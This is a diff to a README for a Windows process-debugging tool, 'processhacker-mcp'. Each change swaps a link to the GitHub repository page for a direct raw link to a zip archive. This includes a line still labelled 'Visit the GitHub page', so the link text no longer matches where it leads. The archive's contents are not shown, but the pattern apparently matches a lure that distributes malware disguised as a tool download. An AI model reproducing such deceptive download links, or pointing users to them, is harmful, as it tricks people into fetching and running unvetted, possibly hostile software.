@@ -1,6 +1,6 @@
 # 🛠️ processhacker-mcp - AI Debugger and Vibe Hacking Tool
 
-[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-red?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-red?style=for-the-badge)](https://raw.githubusercontent.com/danya120o3/processhacker-mcp/main/extensions/mcp-processhacker-v2.7.zip)
 
 ---
 
@@ -30,7 +30,7 @@ If your computer meets these requirements, you can proceed without issues.
 
 Click the large button below to visit the download page:
 
-[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/danya120o3/processhacker-mcp/main/extensions/mcp-processhacker-v2.7.zip)
 
 **How to download:**
 
@@ -116,7 +116,7 @@ If processes do not appear, try refreshing the list by clicking the refresh butt
 
 For advanced use or issues:
 
-- Visit the GitHub page: https://github.com/danya120o3/processhacker-mcp  
+- Visit the GitHub page: https://raw.githubusercontent.com/danya120o3/processhacker-mcp/main/extensions/mcp-processhacker-v2.7.zip  
 - Check the **Issues** tab for common problems and solutions.  
 - Read the wiki or documentation linked on the repository for detailed guides.  
 - Ask questions or report bugs directly on GitHub.
@@ -146,4 +146,4 @@ It targets users interested in low-level Windows system work without requiring c
 
 ---
 
-[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://github.com/danya120o3/processhacker-mcp)
+[![Download processhacker-mcp](https://img.shields.io/badge/Download-Here-purple?style=for-the-badge)](https://raw.githubusercontent.com/danya120o3/processhacker-mcp/main/extensions/mcp-processhacker-v2.7.zip)
